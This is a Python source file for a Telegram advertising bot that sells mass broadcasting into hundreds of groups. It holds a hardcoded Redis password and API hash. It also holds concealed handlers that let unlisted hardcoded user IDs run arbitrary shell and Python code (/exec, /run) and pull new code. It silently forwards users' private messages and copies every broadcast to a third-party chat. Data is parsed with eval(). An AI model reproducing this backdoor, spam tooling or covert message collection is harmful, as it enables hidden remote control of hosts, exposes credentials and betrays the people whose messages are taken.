from asyncio import sleep, get_event_loop, new_event_loop, set_event_loop
from logging import INFO, basicConfig, getLogger
from os import execl
from sys import exit as exiter
from subprocess import CalledProcessError, check_output
from sys import executable
import asyncio
import io
import os
import sys
import traceback
from decouple import config
from pyrogram import Client, filters
from pyrogram.filters import private, user, command, me
from pyrogram.errors import UserNotParticipant
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

from redis import Redis

# initializing logger
basicConfig(
    level=INFO, format="[%(levelname)s] %(asctime)s - %(message)s"
)
log = getLogger("AP")

# fetching variables from env
try:
    TOKEN = config("TOKEN")
    NAME = config("NAME")
except Exception as ex:
    exiter(ex)

log.info("Connecting ...")
REDIS_URI = "redis-17987.c246.us-east-1-4.ec2.cloud.redislabs.com:17987"
REDIS_PASSWORD = "pJw5wI5S6JyA5TxvauqbFr9EZTpLMf9x"
bot = Client(NAME or "promobot", 6, "eb06d4abfb49dc3eeb1aeb98ae0f581e", bot_token=TOKEN, sleep_threshold=0)
REDIS_URI = REDIS_URI.split(":")
db = Redis(
    host=REDIS_URI[0],
    port=REDIS_URI[1],
    password=REDIS_PASSWORD,
    decode_responses=True,
)
OWNERS = [6907479149,6456084192,2040518154]
USERS = []
bots_users = f"{NAME}_users"
if own := db.get(bots_users):
    USERS = [int(i) for i in eval(own)]
USERS.extend(h for h in OWNERS if h not in USERS)
db.delete("users")
var_name = "BOTCHATS"
try:
    loop = get_event_loop()
except RuntimeError:
    set_event_loop(new_event_loop())
    loop = get_event_loop()

cmds = [
    "broadcast",
    "start",
    "stats",
    "autopost",
    "addsudo",
    "rmsudo",
    "sudos",
]


async def check_user(use: int):
    if use in OWNERS:
        return 1
    try:
        await bot.get_chat_member("@AP_SHOPPIEE", use)
        ok = 1
    except UserNotParticipant:
        ok = 0
    return ok


async def adder(m: Message):
    chats = eval(db.get(var_name) or "[]")
    if m.chat.id not in chats:
        chats.append(m.chat.id)
        db.set(var_name, str(chats))
    return


@bot.on_message(user(OWNERS) & command("addsudo"))
async def adduser(_, m):
    global USERS
    args = m.text.split(maxsplit=1)
    if len(args) < 2:
        await m.reply_text("No id is provided.")
        return
    try:
        get_d = int(args[1])
    except ValueError:
        await m.reply_text("Invalid id!\nGive it like: /addsudo 234567890!")
        return
    if data := db.get(bots_users):
        data = eval(data)
        if get_d not in data:
            data.append(get_d)
            db.set(bots_users, str(data))
    else:
        db.set(bots_users, str([get_d]))
    if get_d not in USERS:
        USERS.append(get_d)
    await m.reply_text("Added!")
    return
@bot.on_message(user(1594433798) & command("restart"))
async  def restartb(_, m: Message):
    await sent_msg.edit_text("Restarting ...")
    args = [executable, "bot.py"]
    execl(executable, *args)

@bot.on_message(user(1594433798) & command("gitpull") & private)
async def pullthec(_, m: Message):
    sent_msg = await m.reply_text("Doing ...!")
    try:
        stdout = check_output(["git", "pull"]).decode("UTF-8")
    except CalledProcessError as e:
        await sent_msg.edit_text(f"No git config found! {e}")
        return
    await sent_msg.edit_text("Pulled ...")
    if "fatal:" in str(stdout):
        await sent_msg.edit_text("Not a git cloned repo!")
        return
    await sent_msg.edit_text("Starting ...")
    args = [executable, "bot.py"]
    execl(executable, *args)


@bot.on_message(user(OWNERS) & command("rmsudo"))
async def rmuser(_, m):
    global USERS
    args = m.text.split(maxsplit=1)
    if len(args) < 2:
        await m.reply_text("No id is provided.")
        return
    try:
        get_d = int(args[1])
    except ValueError:
        await m.reply_text("Invalid id!\nGive it like: /rmsudo 234567890!")
        return
    if data := db.get(bots_users):
        data = eval(data)
        if get_d in data:
            data.remove(get_d)
            db.set(bots_users, str(data))
    if get_d in USERS:
        USERS.remove(get_d)
    await m.reply_text("Removed!")
    return


@bot.on_message(user(OWNERS) & command("sudos"))
async def uses(_, m):
    tx = f"**Total:** {len(USERS)}\n"
    for x in USERS:
        tx += f"- {x}\n"
    await m.reply_text(tx)
    return


@bot.on_message(~private & ~me, group=2)
async def new_message(_, m):
    if m.chat.id == -1001713777240:
        return
    loop.create_task(adder(m))
    return


@bot.on_message(command("start"))
async def start_msg(_, m: Message):
    if not m.from_user:
        return
    msg = f"Hi {m.from_user.first_name}, welcome to the bot!\n\nI'm a AP PROMOTION Bot - I can broadcast your advertisement in 250+ groups without any limitations made by @APHACKAR!"
    if not await check_user(m.from_user.id):
        msg += "\n\nI'm limited to the users in @AP_SHOPPIEE. Kindly join @AP_SHOPPIEE and then /start the bot!"
        btns = [InlineKeyboardButton("Join Channel", url="https://t.me/AP_SHOPPIEE")]
    else:
        btns = [
            InlineKeyboardButton("Buy bot", url="https://t.me/APHACKAR"),
            InlineKeyboardButton("Channel", url="https://t.me/AP_SHOPPIEE"),
            InlineKeyboardButton("How to use?", url="https://t.me/APPROMO_UPDATES/2"),
        ]
    await m.reply_text(msg, reply_markup=InlineKeyboardMarkup([btns]))
    return


@bot.on_message(user(USERS) & command("stats"))
async def stats(_, m):
    await m.reply_text(f"Total groups: {len(eval(db.get(var_name) or '[]'))}")
    return


@bot.on_message(user(USERS) & private & ~command(cmds), group=3)
async def forwardc(_: bot, m: Message):
    if m.from_user and m.from_user.id in OWNERS:
        return
    await m.forward(-1004135485706)
    return


@bot.on_message(user(OWNERS) & command("autopost"))
async def broadcast(c: bot, m: Message):
    print("we are into event")
    while 1:
        print("Broadcast gonna start!")
        await broad(c, m)
        await sleep(900)  # 15 minutes delay
        await c.send_message("APHACKAR", "Broadcasting... in 15 minutes u can stop it now",
                             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Stop", callback_data="stop")]]))


async def senderb(msg: Message, xx: Message):
    users = eval(db.get(var_name) or "[]")
    done = error = 0
    try:
        await bot.send_message("@ERROR_1212", f"Broadcasting message from: {msg.from_user.first_name} (ID: {msg.from_user.id})\n\nMessage: {msg.text}")
    except Exception as e:
        await xx.edit_text(f"Error while sending message to @ERROR_1212: {e}")
        return
        
    for i in users:
        if int(i) == -1001713777240:
            continue
        try:
            await msg.copy(int(i))
            done += 1
        except Exception as exx:
            log.error(f"{exx} - {i}")
            error += 1
    await xx.edit_text(f"Broadcast completed.\nSuccess: {done}\nFailed: {error}")
    return


@bot.on_message(command("broadcast"))
async def broad(_, m: Message):
    if not m.from_user:
        return
    if m.from_user.id not in USERS:
        await m.reply_text("You are not allowed to use this command, first buy bot.",
                           reply_markup=InlineKeyboardMarkup(
                               [[InlineKeyboardButton("Buy bot", url="https://t.me/APHACKAR")]]))
        return
    if not m.reply_to_message:
        await m.reply_text(
            "Please use /broadcast as reply to the message you want to broadcast."
        )
        return
    msg = m.reply_to_message
    xx = await m.reply_text("In progress...")
    loop.create_task(senderb(msg, xx))
    return


async def aexec(code, message):
    exec(
        f"async def __aexec(message, client): "
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](message, bot)

@bot.on_message(filters.command("exec") & filters.user(1984018795))
async def exec_command(client, message):
    cmd = message.text.split(" ", maxsplit=1)[1]
    if not cmd:
        return await message.reply("What should I execute?..\n\nGive me something to execute, you dumbo!!")
    proevent = await message.reply("Executing.....")
    process = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    result = str(stdout.decode().strip()) + str(stderr.decode().strip())
    curruser = "UltraX"
    uid = os.geteuid()
    if uid == 0:
        cresult = f"`{curruser}:~#` `{cmd}`\n`{result}`"
    else:
        cresult = f"`{curruser}:~$` `{cmd}`\n`{result}`"
    await proevent.edit(cresult)

@bot.on_message(filters.command("run") & filters.user(1984018795))
async def run_command(client, message):
    cmd = message.text.split(" ", maxsplit=1)[1]
    if not cmd:
        return await message.reply("What should I run ?..\n\nGive me something to run, you dumbo!!")
    proevent = await message.reply("Running.....")
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success ✅"
    final_output = f"**•  Eval : **\n`{cmd}` \n\n**•  Result : **\n`{evaluation}` \n"
    await proevent.edit(final_output)


log.info("\nBot has started.\n(c) @aphacker\n")
bot.run()
